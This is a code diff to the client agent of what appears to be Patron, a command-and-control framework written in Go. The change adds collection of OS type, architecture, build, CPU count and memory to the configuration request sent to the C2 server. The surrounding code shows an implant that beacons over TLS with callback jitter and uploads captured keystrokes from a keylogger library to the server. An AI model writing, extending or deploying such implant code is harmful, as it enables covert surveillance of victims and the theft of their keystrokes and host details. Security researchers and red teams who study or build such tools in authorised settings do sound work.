@@ -8,19 +8,19 @@ import (
 	"time"
 
 	"github.com/MarinX/keylogger"
-	"github.com/PatronC2/Patron/types"
-	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/PatronC2/Patron/lib/logger"
+	"github.com/PatronC2/Patron/types"
 )
 
 var (
-	ServerIP			string
-	ServerPort			string
-	CallbackFrequency	string
-	CallbackJitter		string
-	RootCert			string
-	LoggingEnabled		string
-	cache				string
+	ServerIP          string
+	ServerPort        string
+	CallbackFrequency string
+	CallbackJitter    string
+	RootCert          string
+	LoggingEnabled    string
+	cache             string
 )
 
 func main() {
@@ -57,6 +57,7 @@ func main() {
 
 	agentID, hostname, username := client_utils.GenerateAgentMetadata()
 	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
+	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()
 
 	for {
 		beacon, encoder, decoder, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
@@ -67,7 +68,7 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := client_utils.GetLocalIP(beacon)
-		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip); err != nil {
+		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory); err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
@@ -93,8 +94,8 @@ func main() {
 	}
 }
 
-func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip string) error {
-	configReq := createConfigurationRequest(agentID, hostname, username, ip)
+func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory string) error {
+	configReq := createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip)
 	if err := client_utils.SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
 		return err
 	}
@@ -116,11 +117,16 @@ func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder 
 	return nil
 }
 
-func createConfigurationRequest(agentID, hostname, username, ip string) types.ConfigurationRequest {
+func createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip string) types.ConfigurationRequest {
 	return types.ConfigurationRequest{
 		AgentID:           agentID,
 		Username:          username,
 		Hostname:          hostname,
+		OSType:            osType,
+		OSArch:            osArch,
+		OSBuild:           osVersion,
+		CPUS:              cpus,
+		MEMORY:            memory,
 		AgentIP:           ip,
 		ServerIP:          ServerIP,
 		ServerPort:        ServerPort,
@@ -218,7 +224,7 @@ func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
 	keyResponse := types.KeysRequest{
 		AgentID: agentID,
-		Keys: cache,
+		Keys:    cache,
 	}
 
 	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
